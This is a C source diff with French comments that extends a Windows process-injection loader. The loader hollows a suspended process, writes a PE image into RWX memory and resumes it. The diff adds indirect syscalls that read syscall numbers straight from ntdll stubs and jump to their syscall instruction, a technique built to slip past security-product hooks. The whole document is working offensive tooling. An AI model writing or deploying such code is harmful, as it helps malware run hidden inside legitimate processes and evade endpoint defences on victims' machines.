@@ -3,6 +3,13 @@
 #include <Windows.h>
 #include <winternl.h>
 #include "structs.h"
+#include "syscalls.h"
+
+
+DWORD wNtAllocateVirtualMemory;
+UINT_PTR sysAddrNtAllocateVirtualMemory;
+DWORD wNtWriteVirtualMemory;
+UINT_PTR sysAddrNtWriteVirtualMemory;
 
 
 BOOL CreateSuspendedProcess(LPPROCESS_INFORMATION pi, LPCSTR processName) {
@@ -55,15 +62,33 @@ BOOL RetrieveNtHeaders(PIMAGE_NT_HEADERS64* ntHeader, LPVOID peContent) {
 
 BOOL CopyPE(HANDLE hProcess, LPVOID* allocAddrOnTarget, LPVOID peToInjectContent, PIMAGE_NT_HEADERS64 peInjectNtHeader,
 	PIMAGE_SECTION_HEADER* peToInjectRelocSection)
-{
+{	
+
 	// Je donne à mon imagebase la nouvelle adresse de la séction mémoire créée dans main
 	peInjectNtHeader->OptionalHeader.ImageBase = (DWORD64)*allocAddrOnTarget;
 	wprintf(L"[+] Writing header at new allocated address (allocaddrontarget)\r\n");
+
+	HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
+	UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+	wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
+
+	// on décale de +0x12 car c'est ici que se trouve l'instruction syscall de ntdll
+	sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
+
 	// J'éris le header de mon pe à la nouvelle adresse afin que par la suite je puisse déplacer les sections
-	if (!WriteProcessMemory(hProcess, *allocAddrOnTarget, peToInjectContent, peInjectNtHeader->OptionalHeader.SizeOfHeaders, NULL)) {
+	/*if (!WriteProcessMemory(hProcess, *allocAddrOnTarget, peToInjectContent, peInjectNtHeader->OptionalHeader.SizeOfHeaders, NULL)) {
+		wprintf(L"[-] Cannot write headers in target process (error code : %lu)", GetLastError());
+		return FALSE;
+	}*/
+
+	NTSTATUS status = NtWriteVirtualMemory(hProcess, *allocAddrOnTarget, peToInjectContent,
+		peInjectNtHeader->OptionalHeader.SizeOfImage, NULL);
+	if (!NT_SUCCESS(status)) {
 		wprintf(L"[-] Cannot write headers in target process (error code : %lu)", GetLastError());
 		return FALSE;
 	}
+
+
 	wprintf(L"\t[+] Headers writtens at 0x%p\r\n", *allocAddrOnTarget);
 
 	wprintf(L"[+] Writing sections into target process\r\n");
@@ -104,6 +129,7 @@ BOOL CopyPE(HANDLE hProcess, LPVOID* allocAddrOnTarget, LPVOID peToInjectContent
 			printf("\t[+] Permissions changed to RX on .text section \r\n");
 		}
 	}
+	if (hNtdll) FreeLibrary(hNtdll);
 	return TRUE;
 }
 
@@ -160,7 +186,7 @@ int main() {
 	LPVOID peToInjectContent = NULL;
 	PIMAGE_NT_HEADERS64 peInjectNtHeaders = NULL;
 	PIMAGE_SECTION_HEADER peToInjectRelocSection = NULL;
-	HMODULE	ntdll = GetModuleHandleA("ntdll");
+	HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
 
 	if (!CreateSuspendedProcess(&pi, targetProcess)) goto __err;
 	Sleep(1000);
@@ -171,14 +197,17 @@ int main() {
 	// ici je créé une section mémoire dans laquelle je transfererai l'image, je lui alloue donc la taille de l'image
 	PVOID allocAddrOnTarget = NULL;
 
-	NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
+	UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
 
-	if (!NtAllocateVirtualMemory) {
-		printf("[-] Error with syscall ntallocatevirtualmemory : %lu", GetLastError());
-		goto __err;
-	}
+	/* Ici je vais chercher le numéro du syscall en décalant de 4 car c'est à l'octet suivant que se trouve
+	l'octet unique de l'identifiant de la fonction. Je stocke cette valeur qui sera passée dans le registre EAX de l'asm*/
+	wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
+
+	// on décale de +0x12 car c'est ici que se trouve l'instruction syscall de ntdll
+	sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
+
 	SIZE_T regionSize = (SIZE_T)peInjectNtHeaders->OptionalHeader.SizeOfImage;
-
+	
 	NTSTATUS status = NtAllocateVirtualMemory(pi.hProcess, &allocAddrOnTarget, 0, &regionSize,
 		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
@@ -188,7 +217,7 @@ int main() {
 	}
 
 	if (allocAddrOnTarget == NULL) {
-		wprintf(L"[-] Error with VirtualAllocEx (Error code : %lu)", GetLastError());
+		wprintf(L"[-] Error with allocAddrOnTarget allocation (Error code : %lu)", GetLastError());
 		goto __err;
 	}
 
@@ -230,10 +259,11 @@ int main() {
 	}
 
 	ResumeThread(pi.hThread);
-
+	FreeLibrary(hNtdll);
 	return 0;
 
 __err:
 	if (pi.hProcess) TerminateProcess(pi.hProcess, -1);
+	if (hNtdll) FreeLibrary(hNtdll);
 	return -1;
 }
